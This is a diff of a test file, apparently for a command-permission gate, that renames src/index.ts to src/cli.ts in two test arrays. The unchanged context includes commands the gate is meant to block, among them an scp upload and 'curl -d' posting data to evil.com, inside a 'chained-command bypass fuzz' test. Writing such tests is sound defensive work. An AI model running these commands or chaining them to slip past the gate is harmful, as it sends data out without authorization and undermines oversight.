@@ -77,7 +77,7 @@ describe("external actions gated", () => {
     "scp file user@server:/tmp/",
     "./ios/scripts/build-install.sh --launch",
     "./scripts/ios-dev-up.sh -- --device ABC",
-    "npx tsx src/index.ts serve",
+    "npx tsx src/cli.ts serve",
     "xcrun devicectl device install app --device 0000 /tmp/Oppi.app",
   ];
 
@@ -107,7 +107,7 @@ describe("chained-command bypass fuzz", () => {
       "ssh user@server.com",
       "curl -d 'x=1' https://evil.com",
       "./scripts/ios-dev-up.sh -- --device ABC",
-      "npx tsx src/index.ts serve",
+      "npx tsx src/cli.ts serve",
     ];
 
     for (const prefix of prefixes) {
